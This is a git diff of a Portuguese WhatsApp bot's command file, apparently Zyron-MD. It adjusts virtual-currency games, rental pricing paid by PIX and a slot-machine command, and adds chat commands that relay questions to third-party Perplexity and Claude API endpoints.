+} catch(e) {
+console.log(e)
+reply("❌ Erro ao gerar brat")
+}
+
 }
 break
 
@@ -9362,7 +18920,7 @@ IsCreator,
 SoCriador
 });
 
-if (!So_Dono) return reply('Apenas o dono pode usar essa porra caralho.');
+if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
 
 const CANAIS = [
 '120363427471727828@newsletter',
@@ -9549,8 +19107,17 @@ recompensaTotal: 0
 
 let listaInv = '';
 for (const item in banco[user].inventario) {
-const dados = banco[user].inventario[item];
-listaInv += `⌬ ${item} (${dados.qtd}x) • *$${dados.valor * dados.qtd}*\n`;
+    const dados = banco[user].inventario[item];
+
+    const qtd = typeof dados === 'number'
+        ? dados
+        : (dados?.qtd ?? 0);
+
+    const valor = typeof dados === 'number'
+        ? 0
+        : (dados?.valor ?? 0);
+
+    listaInv += `⌬ ${item} (${qtd}x) • *$${valor * qtd}*\n`;
 }
 if (!listaInv) listaInv = '⌬ 📦 Nenhum item guardado.';
 
@@ -9603,68 +19170,6 @@ salvarBanco(banco);
 } catch (e) {
 console.log(e);
 reply('Erro ao abrir banco.');
-}
-}
-break;
-
-case 'pets':
-case 'meuspets': {
-try {
-
-let banco = carregarBanco();
-const user = getUserBancoId(info, sender, isGroup);
-
-verificarConta(banco, user);
-
-if (!banco[user].pets) banco[user].pets = {};
-
-let listaPets = '';
-let totalPets = 0;
-let totalEspecies = 0;
-
-for (const pet in banco[user].pets) {
-const dados = banco[user].pets[pet];
-
-const qtd = typeof dados === 'object' ? dados.qtd || 0 : dados;
-
-if (qtd > 0) {
-listaPets += `⌬ 🐾 ${pet} (${qtd}x)\n`;
-totalPets += qtd;
-totalEspecies++;
-}
-}
-
-if (!listaPets) {
-listaPets = `⌬ 🐾 Nenhum pet encontrado.\n\nUse *${prefix}cacar* para tentar pegar pets.`;
-}
-
-reply(`╭━━━〔 🐾 𝐙𝐘𝐑𝐎𝐍 𝐏𝐄𝐓𝐒 〕━━━⬣
-┃ 👤 Usuário: ${pushname}
-┃
-┣━━━〔 🐾 𝐂𝐎𝐋𝐄𝐂̧𝐀̃𝐎 𝐃𝐄 𝐏𝐄𝐓𝐒 〕━━━⬣
-${listaPets.trim() || '┃ 📭 Você ainda não possui pets.'}
-┃
-┣━━━〔 📊 𝐄𝐒𝐓𝐀𝐓𝐈́𝐒𝐓𝐈𝐂𝐀𝐒 〕━━━⬣
-┃ 🐕 Total de Pets: ${totalPets}
-┃ 📚 Espécies Diferentes: ${totalEspecies}
-┃
-┣━━━〔 💡 𝐃𝐈𝐂𝐀𝐒 〕━━━⬣
-┃ 🏹 Capture animais usando:
-┃ ${prefix}cacar
-┃
-┃ 💰 Venda seus pets:
-┃ ${prefix}venderpet <nome> <qtd>
-┃
-┃ 📦 Guardar animal:
-┃ ${prefix}guardarpet
-┃
-╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 & 𝐙𝐘𝐑𝐎𝐍-𝐀𝐈 〕━━━⬣`);
-
-salvarBanco(banco);
-
-} catch (e) {
-console.log(e);
-reply('❌ Erro ao abrir seus pets.');
 }
 }
 break;
@@ -10531,7 +20036,8 @@ const itens = [
 { nome: "🐳 Mini Baleia", valor: 1200, chance: 0.5 },
 { nome: "📦 Baú Lendário", valor: 4000, chance: 0.03 },
 { nome: "📍 Plug Anal", valor: 10000, chance: 0.03 },
-{ nome: "🖱️ Mouse Pichau", valor: 4000, chance: 0.03 }
+{ nome: "🖱️ Mouse Pichau", valor: 4000, chance: 0.03 },
+{ nome: "🏎️ BMW Abandonada", valor: 12000, chance: 0.03 }
 ];
 
 function sortearItem(itens) {
@@ -10592,8 +20098,6 @@ total += item.valor;
 const xp = Math.floor(total / 4);
 const sorteDia = Math.floor(Math.random() * 100) + 1;
 
-const bancoPath = './banco.json';
-
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
 }
@@ -10636,10 +20140,12 @@ lista += `┃ 🐟 ${item} (${dados.qtd}x) • *$${dados.valor * dados.qtd}*\n`;
 
 let classificacao = 'Iniciante';
 
-if (total >= 5000) classificacao = 'Lenda dos Mares';
-else if (total >= 3000) classificacao = 'Pescador Elite';
-else if (total >= 1500) classificacao = 'Pescador Profissional';
-else if (total >= 700) classificacao = 'Pescador Experiente';
+const xpTotal = banco[user].xp;
+
+if (xpTotal >= 99999999999) classificacao = 'Lenda dos Mares';
+else if (xpTotal >= 1000000) classificacao = 'Pescador Elite';
+else if (xpTotal >= 100000) classificacao = 'Pescador Profissional';
+else if (xpTotal >= 1000) classificacao = 'Pescador Experiente';
 
 const msgFinal = `╭━━━〔 🎣 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
 ${lista.trim()}
@@ -10677,8 +20183,6 @@ break;
 
 case 'guardarpeixe': {
 try {
-
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -10732,8 +20236,6 @@ break;
 
 case 'venderpeixe': {
 try {
-
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -10793,7 +20295,6 @@ return reply('🎰 A aposta mínima é de $50.');
 }
 
 // banco.json
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -10917,11 +20418,144 @@ reply(`╭━━━〔 ❌ 𝐄𝐑𝐑𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
 }
 break;
 
+case 'tigrinho':
+case 'fortune':
+case 'fortunetiger': {
+try {
+
+const aposta = parseInt(q);
+
+if (!q) return reply(`🐯 Digite o valor da aposta.\n\nExemplo:\n${prefix}tigrinho 500`);
+
+if (isNaN(aposta) || aposta < 50) {
+return reply('🐯 A aposta mínima é de $50.');
+}
+
+if (!fs.existsSync(bancoPath)) {
+fs.writeFileSync(bancoPath, '{}');
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+if (!banco[user]) {
+banco[user] = {
+saldo: 0,
+xp: 0
+};
+}
+
+if (banco[user].saldo < aposta) {
+return reply(`╭━━━〔 🐯 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
+┃ ❌ Saldo insuficiente.
+┃
+┃ 💸 Aposta: *$${aposta}*
+┃ 🏦 Saldo: *$${banco[user].saldo}*
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣`);
+}
+
+const simbolos = [
+'🐯',
+'🪙',
+'💰',
+'💎',
+'🍀',
+'7️⃣',
+'⭐',
+'👑'
+];
+
+function girar() {
+return simbolos[Math.floor(Math.random() * simbolos.length)];
+}
+
+await reply(`╭━━━〔 🐯 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
+┃ 🎰 Girando os rolos...
+┃ 💸 Aposta: *$${aposta}*
+┃ 🍀 Boa sorte!
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+await new Promise(r => setTimeout(r, 1800));
+
+let a = girar(), b = girar(), c = girar();
+
+await reply(`🎰 ${a} │ ❓ │ ❓`);
+
+await new Promise(r => setTimeout(r, 1000));
+
+await reply(`🎰 ${a} │ ${b} │ ❓`);
+
+await new Promise(r => setTimeout(r, 1000));
+
+let premio = 0;
+let resultado = '';
+let multiplicador = 0;
+
+if (a === '🐯' && b === '🐯' && c === '🐯') {
+multiplicador = 15;
+resultado = '💥 𝐌𝐄𝐆𝐀 𝐉𝐀𝐂𝐊𝐏𝐎𝐓!';
+}
+else if (a === b && b === c) {
+multiplicador = 8;
+resultado = '🏆 𝐉𝐀𝐂𝐊𝐏𝐎𝐓!';
+}
+else if (a === b || b === c || a === c) {
+multiplicador = 2;
+resultado = '🎉 𝐏𝐑𝐄̂𝐌𝐈𝐎!';
+}
+else if (Math.random() < 0.10) {
+multiplicador = 1;
+resultado = '🤑 𝐀𝐏𝐎𝐒𝐓𝐀 𝐃𝐄𝐕𝐎𝐋𝐕𝐈𝐃𝐀!';
+}
+
+if (multiplicador > 0) {
+premio = aposta * multiplicador;
+banco[user].saldo += premio;
+} else {
+premio = aposta;
+banco[user].saldo -= aposta;
+resultado = '💀 𝐕𝐎𝐂𝐄̂ 𝐏𝐄𝐑𝐃𝐄𝐔!';
+}
+
+fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));
+
+const sorte = Math.floor(Math.random() * 100) + 1;
+
+reply(`╭━━━〔 🐯 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
+┃
+┃        ${a} │ ${b} │ ${c}
+┃
+┣━━━〔 📊 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 〕━━━⬣
+┃ ${resultado}
+┃ 💸 Aposta: *$${aposta}*
+${
+multiplicador > 0
+? `┃ ✖️ Multiplicador: *${multiplicador}x*
+┃ 💰 Ganhou: *+$${premio}*`
+: `┃ 📉 Perdeu: *-$${aposta}*`
+}
+┃ 🏦 Saldo: *$${banco[user].saldo}*
+┃
+┣━━━〔 👤 𝐉𝐎𝐆𝐀𝐃𝐎𝐑 〕━━━⬣
+┃ 👤 ${pushname}
+┃ 🍀 Sorte: *${sorte}%*
+┃
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+} catch (e) {
+console.log(e);
+reply(`╭━━━〔 ❌ 𝐅𝐎𝐑𝐓𝐔𝐍𝐄 𝐓𝐈𝐆𝐄𝐑 〕━━━⬣
+┃ Ocorreu um erro.
+┃ Tente novamente.
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+}
+}
+break;
+
 case 'mineracao':
 case 'minerar': {
 try {
-
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -11070,8 +20704,6 @@ break;
 case 'guardarminerio': {
 try {
 
-const bancoPath = './banco.json';
-
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
 }
@@ -11126,8 +20758,6 @@ break;
 case 'venderminerio': {
 try {
 
-const bancoPath = './banco.json';
-
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
 }
@@ -11170,8 +20800,6 @@ break;
 case 'inventario':
 case 'inv': {
 try {
-
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -11236,8 +20864,6 @@ break;
 case 'batalhanaval':
 case 'naval': {
 try {
-
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -11337,6 +20963,20 @@ banco[user].xp += xp;
 
 fs.writeFileSync(bancoPath, JSON.stringify(banco, null, 2));
 
+const xpTotal = banco[user].xp;
+
+let patente = '⚓ Marinheiro';
+
+if (xpTotal >= 1000000) patente = '👑 Almirante Supremo';
+else if (xpTotal >= 500000) patente = '🛳️ Almirante';
+else if (xpTotal >= 250000) patente = '🚢 Vice-Almirante';
+else if (xpTotal >= 100000) patente = '⛴️ Contra-Almirante';
+else if (xpTotal >= 50000) patente = '🛥️ Capitão';
+else if (xpTotal >= 20000) patente = '⚓ Comandante';
+else if (xpTotal >= 10000) patente = '🧭 Tenente';
+else if (xpTotal >= 5000) patente = '🎖️ Sargento';
+else if (xpTotal >= 1000) patente = '🚤 Marinheiro Veterano';
+
 const msg = `╭━━━〔 🚢 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐍𝐀𝐕𝐀𝐋 〕━━━⬣
 ${resultadoTiros.trim()}
 ┃
@@ -11371,8 +21011,6 @@ case 'caca':
 case 'caçar':
 case 'cacar': {
 try {
-
-const bancoPath = './banco.json';
 
 if (!fs.existsSync(bancoPath)) {
 fs.writeFileSync(bancoPath, '{}');
@@ -11412,7 +21050,27 @@ const animais = [
 { nome: "🐲 Dragão de komodo", valor: 7945, chance: 2 },
 { nome: "🐦‍🔥 Fênix", valor: 8390, chance: 1 },
 { nome: "🦑 Luiz Inácio Lula da Silva", valor: 0, chance: 50 },
-{ nome: "☢️ Bomba radioativa", valor: 10000, chance: 0.1 }
+{ nome: "☢️ Bomba radioativa", valor: 10000, chance: 0.1 },
+{ nome: "🐿️ Esquilo", valor: 45, chance: 40 },
+{ nome: "🦔 Ouriço", valor: 70, chance: 30 },
+{ nome: "🦝 Guaxinim", valor: 120, chance: 22 },
+{ nome: "🦨 Gambá", valor: 150, chance: 18 },
+{ nome: "🦡 Texugo", valor: 220, chance: 15 },
+{ nome: "🐒 Macaco", valor: 300, chance: 12 },
+{ nome: "🦜 Arara", valor: 420, chance: 10 },
+{ nome: "🦅 Águia", valor: 650, chance: 8 },
+{ nome: "🐅 Tigre", valor: 950, chance: 6 },
+{ nome: "🦁 Leão", valor: 1200, chance: 5 },
+{ nome: "🦍 Gorila", valor: 1600, chance: 4 },
+{ nome: "🦛 Hipopótamo", valor: 2100, chance: 3.5 },
+{ nome: "🦏 Rinoceronte", valor: 2800, chance: 3 },
+{ nome: "🐘 Elefante", valor: 3500, chance: 2.5 },
+{ nome: "🦖 Tiranossauro Rex", valor: 7000, chance: 1.5 },
+{ nome: "🦄 Unicórnio", valor: 8500, chance: 1 },
+{ nome: "👹 Yeti", valor: 9500, chance: 0.8 },
+{ nome: "🐉 Dragão Ancestral", valor: 12000, chance: 0.5 },
+{ nome: "🌌 Guardião Celestial", valor: 18000, chance: 0.2 },
+{ nome: "👽 Alienígena Perdido", valor: 25000, chance: 0.05 }
 ];
 
 function sortearAnimal(lista) {
@@ -11484,6 +21142,14 @@ for (const item in capturas) {
 const dados = capturas[item];
 lista += `⌬ ${item} (${dados.qtd}x) • *$${dados.valor * dados.qtd}*\n`;
 }
+
+let classificacao = "Iniciante";
+
+if (banco[user].xp >= 999999999) classificacao = "Lendário";
+else if (banco[user].xp >= 1000000) classificacao = "Mestre";
+else if (banco[user].xp >= 100000) classificacao = "Veterano";
+else if (banco[user].xp >= 10000) classificacao = "Caçador";
+else if (banco[user].xp >= 1000) classificacao = "Aprendiz";
 
 const msgFinal = `╭━━━〔 🏹 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎 𝐙𝐘𝐑𝐎𝐍 〕━━━⬣
 ${lista.trim()}
@@ -11677,7 +21343,7 @@ const opcoes = q.split(',').map(v => v.trim()).filter(Boolean);
 
 if (opcoes.length < 2) return reply('_Mínimo de 2 opções._');
 
-const { data } = await axios.get('https://systemzone.store/api/canvas/roleta', {
+const { data } = await axios.get('https://zone.api.br/api/canvas/roleta', {
 params: {
 text: opcoes.join(',')
 }
@@ -11708,7 +21374,6 @@ break;
 case 'leilao': {
 try {
 
-const fs = require('fs');
 const path = './database/leiloes.json';
 
 if (!fs.existsSync('./database')) fs.mkdirSync('./database');
@@ -11995,16 +21660,23 @@ const tempo = args[0];
 if (!tempo) return reply(`💰 *ALUGAR BOT*
 
 Use:
-${prefix}alugar semanal
 ${prefix}alugar diario
+${prefix}alugar semanal
 ${prefix}alugar mensal
 ${prefix}alugar trimensal`);
 
 const planos = {
-    diario: { dias: 1, valor: 7 },
+    diario: { dias: 1, valor: 5 },
     semanal: { dias: 7, valor: 15 },
-    mensal: { dias: 30, valor: 55 },
-    'trimensal': { dias: 90, valor: 135 }
+    mensal: { dias: 30, valor: 50 },
+    trimensal: { dias: 90, valor: 95 }
+};
+
+const imagens = {
+    diario: 'https://SEU-LINK-DO-DIARIO.jpg',
+    semanal: 'https://SEU-LINK-DO-SEMANAL.jpg',
+    mensal: 'https://SEU-LINK-DO-MENSAL.jpg',
+    trimensal: 'https://SEU-LINK-DO-TRIMENSAL.jpg'
 };
 
 if (!planos[tempo.toLowerCase()])
@@ -12027,18 +21699,24 @@ pedidos[pedidoId] = {
 
 jsonSave(caminhoPedidosAluguel, pedidos);
 
-reply(`🛒 *PEDIDO DE ALUGUEL CRIADO*
+await conn.sendMessage(from, {
+    image: {
+        url: imagens[tempo.toLowerCase()]
+    },
+    caption: `🛒 *PEDIDO DE ALUGUEL CRIADO*
 
 🆔 Pedido: *${pedidoId}*
 📦 Plano: *${tempo}*
 ⏳ Duração: *${plano.dias} dias*
 💰 Valor: *R$ ${plano.valor.toFixed(2)}*
 
-💸 *PIX:*
+💸 *PIX*
 \`\`\`${CHAVE_PIX}\`\`\`
 
-Após pagar, envie o comprovante no privado do dono:
-wa.me/5519995729970`);
+📤 Após realizar o pagamento, envie o comprovante no privado do proprietário.
+
+📞 https://wa.me/5519995729970`
+}, { quoted: info });
 
 } catch (e) {
 console.log(e);
@@ -12049,7 +21727,7 @@ break;
 
 case 'aprovaraluguel': {
 try {
-if (!isDono) return reply('❌ Apenas o dono pode aprovar aluguel.');
+if (!So_Dono) return reply(msg.SoDono);
 
 const pedidoId = args[0];
 if (!pedidoId) return reply(`Use: ${prefix}aprovaraluguel ID`);
@@ -12097,7 +21775,7 @@ break;
 
 case 'recusaraluguel': {
 try {
-if (!isDono) return reply('❌ Apenas o dono pode recusar aluguel.');
+if (!So_Dono) return reply(msg.SoDono);
 
 const pedidoId = args[0];
 if (!pedidoId) return reply(`Use: ${prefix}recusaraluguel ID`);
@@ -12212,145 +21890,6 @@ reply('❌ Erro.');
 }
 break;
 
-//vozes
-
-case "vozes": {
-try {
-  let txt = `🎙️ *VOZES DISPONÍVEIS - ZYRON TTS*\n\n`;
-
-  Object.keys(vozesTTS).forEach((nome, i) => {
-    txt += `${i + 1}. ${nome}\n`;
-  });
-
-  txt += `\n━━━━━━━━━━━━━━━\n`;
-  txt += `📌 *Como usar:*\n\n`;
-  txt += `${prefix}tts Bom dia\n`;
-  txt += `${prefix}tts Bom dia / ana\n`;
-  txt += `${prefix}tts Bom dia / antonio / mp3 / 120 / 10\n\n`;
-  txt += `📍 Ordem:\n`;
-  txt += `texto / voz / formato / volume / velocidade\n\n`;
-  txt += `🎧 Formato padrão: mp3\n`;
-  txt += `🔊 Volume padrão: 100\n`;
-  txt += `⚡ Velocidade padrão: 0`;
-
-  reply(txt);
-
-} catch (e) {
-  console.log(e);
-  reply("❌ Erro ao listar vozes.");
-}
-}
-break;
-
-case "tts": {
-try {
-  if (!q) {
-    return reply(
-`🎙️ *ZYRON TTS*
-
-Use assim:
-
-${prefix}tts Bom dia
-
-Ou:
-
-${prefix}tts Bom dia / ana
-
-Ou completo:
-
-${prefix}tts Bom dia / ana / mp3 / 120 / 10
-
-Para ver as vozes:
-${prefix}vozes`
-    );
-  }
-
-  await conn.sendMessage(from, {
-    react: { text: "⏳", key: info.key }
-  });
-
-  const partes = q.split("/").map(v => v.trim());
-
-  const texto = partes[0];
-  const vozNome = (partes[1] || "ana").toLowerCase();
-  const volume = partes[3] && !isNaN(partes[3]) ? Number(partes[3]) : 100;
-  const velocidade = partes[4] && !isNaN(partes[4]) ? Number(partes[4]) : -20;
-  
-  const formatos = {
-    mp3: "audio-24khz-48kbitrate-mono-mp3",
-    mp3hq: "audio-24khz-96kbitrate-mono-mp3",
-    mp3max: "audio-48khz-192kbitrate-mono-mp3",
-    ogg: "ogg-48khz-16bit-mono-opus",
-    opus: "ogg-48khz-16bit-mono-opus",
-    webm: "webm-24khz-16bit-mono-opus"
-};
-
-const formatoInput = (partes[2] || "mp3").toLowerCase();
-
-if (!formatos[formatoInput]) {
-    return reply(`❌ Formato inválido.
-
-Formatos:
-
-• mp3
-• mp3hq
-• mp3max
-• ogg
-• opus
-• webm`);
-}
-
-const formato = formatos[formatoInput];
-
-  if (!texto) return reply("❌ Digite o texto do áudio.");
-
-  if (!vozesTTS[vozNome]) {
-    return reply(
-`❌ Voz não encontrada.
-
-Use:
-${prefix}vozes
-
-Exemplo:
-${prefix}tts Bom dia / ana`
-    );
-  }
-
-  if (volume < 0 || volume > 200) {
-    return reply("❌ Volume inválido. Use de 0 até 200.");
-  }
-
-  if (velocidade < -50 || velocidade > 100) {
-    return reply("❌ Velocidade inválida. Use de -50 até 100.");
-  }
-
-  const pasta = path.join(__dirname, "tmp");
-  if (!fs.existsSync(pasta)) fs.mkdirSync(pasta);
-
-  const arquivo = path.join(pasta, `tts_${Date.now()}.mp3`);
-
-  await gerarTTS(texto, vozesTTS[vozNome], arquivo, volume, velocidade);
-
-  await conn.sendMessage(from, {
-    audio: fs.readFileSync(arquivo),
-    mimetype: "audio/mpeg",
-    ptt: false,
-    fileName: "tts.mp3"
-  }, { quoted: info });
-
-  fs.unlinkSync(arquivo);
-
-  await conn.sendMessage(from, {
-    react: { text: "✅", key: info.key }
-  });
-
-} catch (e) {
-  console.log("ERRO TTS:", e);
-  reply("❌ Erro ao gerar áudio. Veja se está atualizado.");
-}
-}
-break;
-
 //comandos de chapado
 
 case 'infobot2': {
@@ -12418,6 +21957,7 @@ break;
 
 case 'nametag': {
 try {
+        
     const nome = q ? q.replace(/\\n/g, '\n') : 'GZEE';
 
     const partes = [];
@@ -12471,7 +22011,532 @@ try {
 }
 break;
 
+case 'helptag': {
+    try {
+        
+        const texto =
+`📌 *COMO USAR O NAMETAG*
+
+O comando *nametag* serve para enviar texto com suporte a:
+
+🧠 Código (CODE)
+📄 Texto normal
+⚡ Mensagens formatadas
+
+---
+
+📌 *COMO USAR:*
+
+👉 Texto normal:
+$nametag Olá mundo
+
+👉 Com quebra de linha:
+$nametag Olá\\nTudo bem?
+
+👉 Com código:
+$nametag \`\`\`js
+console.log("Olá mundo")
+\`\`\`
+
+---
+
+📌 *O QUE ELE FAZ:*
+✔ Detecta código automaticamente
+✔ Transforma em mensagem RICH
+✔ Suporta múltiplos blocos
+✔ Envia texto formatado
+
+---
+
+📌 *EXEMPLO COMPLETO:*
+$nametag Olá pessoal!
+
+\`\`\`js
+function teste() {
+  return "ok"
+}
+\`\`\`
+
+`;
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '📌', key: m.key }
+        });
+
+        const partes = [];
+        const capabilities = [];
+
+        const blocos = texto.split(/(```[\s\S]*?```)/g);
+
+        for (const bloco of blocos) {
+            if (!bloco?.trim()) continue;
+
+            // CODE
+            const codeMatch = bloco.match(/^```(\w*)\n([\s\S]*?)```$/);
+
+            if (codeMatch) {
+                partes.push(conn.makeCode(
+                    codeMatch[1] || 'text',
+                    codeMatch[2].trim()
+                ));
+
+                capabilities.push('RICH_RESPONSE_CODE');
+                continue;
+            }
+
+            // TEXT
+            partes.push(conn.makeText(bloco.trim()));
+        }
+
+        await conn.sendRich(
+            m.chat,
+            partes,
+            m,
+            capabilities
+        );
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '✅', key: m.key }
+        });
+
+    } catch (e) {
+        console.log("ERRO HELPTAG:", e);
+        return conn.sendMessage(m.chat, {
+            text: '❌ Erro ao mostrar ajuda do nametag.'
+        }, { quoted: m });
+    }
+
+    break;
+}
+
 //comandos uteis
+
+case 'perp': {
+    try {
+        const text = q?.trim();
+
+        if (!q) {
+            return conn.sendMessage(m.chat, {
+                text: '_Digite sua pergunta para o Perplexity._'
+            }, { quoted: m });
+        }
+
+        // 🔥 anti pergunta muito curta (evita erro de stream)
+        if (text.length < 4) {
+            return conn.sendMessage(m.chat, {
+                text: '❌ Pergunta muito curta. Tente ser mais específico.'
+            }, { quoted: m });
+        }
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '🔎', key: m.key }
+        });
+
+        const sessionId = m.isGroup ? m.chat : m.sender;
+
+        const axios = require('axios');
+
+        let data;
+
+        try {
+            const res = await axios.get(
+                `https://zone.api.br/api/perplexity?q=${encodeURIComponent(text)}&id=${encodeURIComponent(sessionId)}`
+            );
+            data = res.data;
+        } catch (err) {
+            throw new Error('Falha na conexão com Perplexity API');
+        }
+
+        console.log('[PERP DEBUG]', JSON.stringify(data, null, 2));
+
+        // 🔥 trata erro do backend (incluindo stream quebrado)
+        if (!data || data.status === false) {
+            throw new Error(
+                data?.mensagem ||
+                data?.erro ||
+                'API retornou erro desconhecido'
+            );
+        }
+
+        const resposta =
+            data?.text ||
+            data?.result ||
+            data?.resposta ||
+            data?.data?.text ||
+            '';
+
+        if (!resposta || !resposta.trim()) {
+            throw new Error('Perplexity retornou resposta vazia');
+        }
+
+        const partes = [];
+        const capabilities = new Set();
+
+        const blocos = resposta.split(/(```[\s\S]*?```)/g);
+
+        for (const bloco of blocos) {
+            if (!bloco?.trim()) continue;
+
+            // ───── CODE ─────
+            const codeMatch = bloco.match(/^```(\w*)\n([\s\S]*?)```$/);
+
+            if (codeMatch) {
+                const lang = codeMatch[1] || 'text';
+                const code = codeMatch[2].trim();
+
+                partes.push(conn.makeCode(lang, code));
+                capabilities.add('RICH_RESPONSE_CODE');
+                continue;
+            }
+
+            // ───── TABLE ─────
+            if (/^\|.*\|/m.test(bloco)) {
+                const linhas = bloco.split('\n')
+                    .filter(l => l.trim().startsWith('|') && l.includes('|'));
+
+                if (linhas.length > 0) {
+                    const tabela = linhas.map(l =>
+                        l.split('|')
+                            .map(c => c.trim())
+                            .filter(Boolean)
+                    );
+
+                    partes.push(conn.makeTable(tabela));
+                    capabilities.add('RICH_RESPONSE_TABLE');
+                    continue;
+                }
+            }
+
+            // ───── TEXT ─────
+            const texto = bloco.trim();
+            if (texto) {
+                partes.push(conn.makeText(texto));
+            }
+        }
+
+        if (!partes.length) {
+            partes.push(conn.makeText(resposta));
+        }
+
+        await conn.sendRich(
+            m.chat,
+            partes,
+            m,
+            [...capabilities]
+        );
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '✅', key: m.key }
+        });
+
+    } catch (e) {
+        console.error('[PERPLEXITY ERROR]', e?.message || e);
+
+        const msg = e?.message || '';
+
+        // 🔥 tratamento especial do erro de stream
+        if (msg.includes('stream')) {
+            return conn.sendMessage(m.chat, {
+                text: '⚠️ A IA não conseguiu finalizar a resposta.\nTente reformular a pergunta.'
+            }, { quoted: m });
+        }
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '💔', key: m.key }
+        });
+
+        return conn.sendMessage(m.chat, {
+            text: '_Erro ao consultar o Perplexity. Tente novamente mais tarde._'
+        }, { quoted: m });
+    }
+
+    break;
+}
+
+case 'claude': {
+    try {
+        const text = q?.trim();
+
+        if (!q) {
+            return conn.sendMessage(m.chat, {
+                text: '_Por favor, informe o texto que deseja enviar ao Claude._'
+            }, { quoted: m });
+        }
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '🤖', key: m.key }
+        });
+
+        const sessionId = m.isGroup ? m.chat : m.sender;
+
+        const { data } = await axios.get(
+            `https://zone.api.br/api/ia/claude-haiku?apikey=freekey&text=${encodeURIComponent(text)}&id=${encodeURIComponent(sessionId)}`
+        );
+
+        const respostaIA = data?.text?.trim();
+
+        if (!respostaIA) {
+            throw new Error('Resposta vazia da IA');
+        }
+
+        const partes = [];
+        const capabilities = new Set();
+
+        const blocos = respostaIA.split(/(```[\s\S]*?```)/g);
+
+        for (const bloco of blocos) {
+            if (!bloco || !bloco.trim()) continue;
+
+            // ───── CODE ─────
+            const codeMatch = bloco.match(/^```(\w*)\n([\s\S]*?)```$/);
+
+            if (codeMatch) {
+                const lang = codeMatch[1] || 'text';
+                const code = codeMatch[2].trim();
+
+                partes.push(conn.makeCode(lang, code));
+                capabilities.add('RICH_RESPONSE_CODE');
+                continue;
+            }
+
+            // ───── TABLE ─────
+            if (/^\|.*\|/m.test(bloco)) {
+                const linhas = bloco.split('\n');
+
+                const tabela = linhas
+                    .filter(l => l.trim().startsWith('|') && l.includes('|'))
+                    .map(l =>
+                        l.split('|')
+                            .map(c => c.trim())
+                            .filter(Boolean)
+                    );
+
+                if (tabela.length > 0) {
+                    partes.push(conn.makeTable(tabela));
+                    capabilities.add('RICH_RESPONSE_TABLE');
+                    continue;
+                }
+            }
+
+            // ───── TEXT ─────
+            partes.push(conn.makeText(bloco.trim()));
+        }
+
+        if (!partes.length) {
+            partes.push(conn.makeText(respostaIA));
+        }
+
+        await conn.sendRich(
+            m.chat,
+            partes,
+            m,
+            [...capabilities]
+        );
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '✅', key: m.key }
+        });
+
+    } catch (e) {
+        console.error('[CLAUDE ERROR]', e?.response?.data || e?.message || e);
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '💔', key: m.key }
+        });
+
+        return conn.sendMessage(m.chat, {
+            text: '_Erro ao consultar o Claude. Tente novamente mais tarde._'
+        }, { quoted: m });
+    }
+
+    break;
+}
+
+case 'memoriakiyora': {
+try {
+
+const fs = require("fs");
+
+const path = "./database/memoriakiyora.json";
+
+if (!fs.existsSync(path)) {
+fs.writeFileSync(path, "[]");
+}
+
+let memoria = JSON.parse(fs.readFileSync(path));
+
+if (!q) return reply(
+`🧠 *MEMÓRIA KIYORA*
+
+Use:
+${prefix}memoriakiyora add texto
+
+Exemplo:
+${prefix}memoriakiyora add Meu nome é Juan`
+);
+
+if (q.startsWith("add ")) {
+
+let texto = q.slice(4).trim();
+
+if (!texto) return reply("❌ Digite o que deseja adicionar.");
+
+memoria.push(texto);
+
+fs.writeFileSync(path, JSON.stringify(memoria, null, 2));
+
+return reply(`🧠 Memória adicionada:
+
+"${texto}"`);
+
+}
+
+if (q === "listar") {
+
+if (!memoria.length)
+return reply("🧠 Nenhuma memória salva.");
+
+return reply(
+`🧠 *MEMÓRIAS KIYORA*
+
+${memoria.map((m,i)=>`${i+1}. ${m}`).join("\n")}`
+);
+
